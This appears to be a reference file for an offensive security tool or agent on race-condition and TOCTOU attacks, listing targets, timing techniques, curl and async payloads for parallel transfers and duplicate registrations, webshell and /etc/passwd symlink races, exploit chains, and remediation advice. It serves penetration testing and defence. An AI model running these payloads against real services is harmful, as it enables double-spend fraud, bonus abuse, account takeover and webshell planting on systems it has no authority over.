---
name: race_condition
description: Race condition and TOCTOU exploits for limit bypass and double-spend attacks
---

# Race Conditions

## Attack Surface
- Financial operations: balance transfers, coupon/voucher redemption, reward point claims
- Rate limiting and quota enforcement: API rate limits, download counters, vote systems
- Authentication flows: password reset token consumption, MFA verification, session creation
- File operations: TOCTOU in file upload validation, symlink races, temp file creation

## Detection Techniques
- Send identical requests in parallel (10-50+ simultaneous) using HTTP/2 single-packet attack for precise timing
- Monitor for inconsistent state: duplicate records, negative balances, bypassed limits
- Use Turbo Intruder (Burp) or custom async scripts to synchronize requests within microseconds
- Test with the "last-byte sync" technique: send all requests with final byte withheld, then release simultaneously
- Check for non-atomic read-modify-write patterns in state-changing operations

## Common Payloads

```
# Python async race (httpx)
# tasks = [client.post("/redeem", json={"coupon":"SAVE50"}) for _ in range(50)]
# results = await asyncio.gather(*tasks)  # expect 1 success, observe many

# Turbo Intruder - HTTP/2 single-packet attack
# engine = RequestEngine(endpoint=target.endpoint, engine=Engine.HTTP2)
# for i in range(30): engine.queue(target.req, gate='race')
# engine.openGate('race')

# curl - parallel execution
seq 1 20 | xargs -P20 -I{} curl -s -X POST https://target.com/api/transfer \
  -H "Authorization: Bearer TOKEN" -d '{"amount":100,"to":"attacker"}'

# Race condition on password reset
# 1. Request password reset -> token sent to email
# 2. Simultaneously: use token + request another reset
# Result: token reuse or multiple valid tokens

# File upload TOCTOU
# 1. Upload legitimate file -> passes validation
# 2. Race: replace file content with webshell before server moves it to final location
# Symlink variant: upload symlink pointing to /etc/passwd, race against validation check

# Double registration race
seq 1 10 | xargs -P10 -I{} curl -s -X POST https://target.com/api/register \
  -d '{"email":"victim@test.com","referral_bonus":true}'
```

## Bypass Techniques
- Use HTTP/2 single-packet attack: multiplex all requests in one TCP packet to eliminate network jitter
- Pre-establish connections and use the "last-byte synchronization" method for HTTP/1.1 targets
- Target different backend servers behind a load balancer to exploit per-instance state
- Chain with session fixation: create multiple sessions to multiply the race window
- Exploit database eventual consistency in distributed systems (NoSQL, microservices)

## Exploit Chaining
- Race condition + business logic: double-spend attack on financial transfers, then withdraw before reconciliation
- Race condition + privilege escalation: simultaneously create account and assign role before permission check completes
- TOCTOU + file upload: win the race between validation and storage to plant a webshell or overwrite critical files

## Remediation
- Use database-level atomic operations: `SELECT ... FOR UPDATE`, `UPDATE ... WHERE balance >= amount`
- Implement idempotency keys for all state-changing operations (unique per-request tokens)
- Use distributed locks (Redis SETNX, database advisory locks) for critical sections
- Apply pessimistic locking on sensitive resources; avoid optimistic concurrency without retry limits
